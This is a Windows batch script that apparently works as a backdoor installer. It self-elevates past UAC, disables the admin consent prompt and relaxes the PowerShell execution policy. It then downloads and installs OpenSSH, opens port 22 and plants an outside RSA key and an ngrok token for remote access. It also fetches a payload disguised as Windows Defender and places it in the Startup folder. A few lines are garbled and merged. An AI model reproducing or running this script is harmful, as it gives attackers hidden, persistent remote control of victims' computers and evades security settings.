@echo off 
:-------------------------------------
@echo off 
REM  --> Analizando los permisos
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

@echo off 
if '%errorlevel%' NEQ '0' (
@echo off 
goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------  
::/Pro
PowerShell Set-ExecutionPolicy RemoteSigned -Force
PowerShell Set-ExecutionPolicy Unrestricted -Force
PowerShell Set-ExecutionPolicy Bypass -Scope Process -Force
PowerShell Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value "0" 
PowerShell New-Item -Path c:\ -Name temp -ItemType Directory
PowerShell [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/ghostman2709/files/main/OpenSSH-Win64.zip','C:\temp\OpenSSH-Win64.zip')
PowerShell Expand-Archive -Path "c:\temp\OpenSSH-Win64.Zip" -DestinationPath "C:\ProgramData\OpenSSH"
PowerShell . "C:\ProgramData\OpenSSH\OpenSSH-Win64\install-sshd.ps1"
PowerShell New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
PowerShell Set-Service sshd -StartupType Automatic
PowerShell New-item -Path $env:USERPROFILE -Name .ssh -ItemType Directory -force
PowerShell New-item -Path $env:USERPROFILE -Name .ngrok2 -ItemType Directory -force
PowerShell Set-Content C:\%HoMePath%\.ssh\hauthorized_keys 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5/ZneIjWq5GE1DIvJQZN/FR8i3xZwLqDqTdjgMD5Lm5lFnNasX5VKGOpwupXB78rDAwQly/lNJfgoLQuO2P5iUHf9O2UhoBVRvdO1mTUQWWQ0IPM2AM55nPpABqqKOgJGQSlo3Nfy5rBMcL1E4z1EWe1QEBJqaThyqelZgULeCFrF3K4uK7PDG2m9Aa1VUtRSNqiJGm15pE/Ks8NvTAsXIjLeYNkHqV9O6dT88Wilr4WzsycO39NgvvUkGZ8TT+fOGP1bPneQVwCEpS9fuJjnlnZtZYMlFkdOjsWXIzo6ixlg88X2vVIpavR7Fi8gcL+h6itcAHhvYOiNXQly8E3vfBUxjEj3MvUYXYwS8LJqfv7xuDI8oGpdWcELpE1TKDTeJGkREIuvYqWZVJ+J+5BIqFVijxvnGpigYV9z/T55o12Qm2OpQJD5e/Xyi+zEY3xBoAFX4mAqP6WTO74+Vkr9oRCbJGN+NvZoD/E8ivQj2+4XJvzGxbHqk/ZziPQ0fKU= u0_a740@localhost'
PowerShell Set-Content C:\%HoMePath%\.ngrok2\ngrok.yml '7zFPzj3u8MAQjqyJsMKWx_5otRYcmDfdQfq1PRTcSTe'
PowerShell [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/ghostman2709/files/main/Windows-Defender.zip','C:\%HoMePath%\AppData\Roaming\Microsoft\Windows\Windows-Defender.zip')
PowerShell [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/ghostman2709/files/main/WindowsSecurityDefender.vbs','
PowerShell Expand-Archive -Path "c:\%HoMePath%\AppData\Roaming\Microsoft\Windows\Windows-Defender.Zip" -DestinationPath "C:\%HoMePath%\AppData\Roaming\Microsoft\Windows"C:\%HoMePath%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityDefender.vbs')
attrib -h -s -r C:\%HoMePath%\.ngrok2
attrib -h -s -r C:\%HoMePath%\.ssh
PowerShell Start-Service sshd
C:\%HoMePath%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityDefender.vbs
EXIT
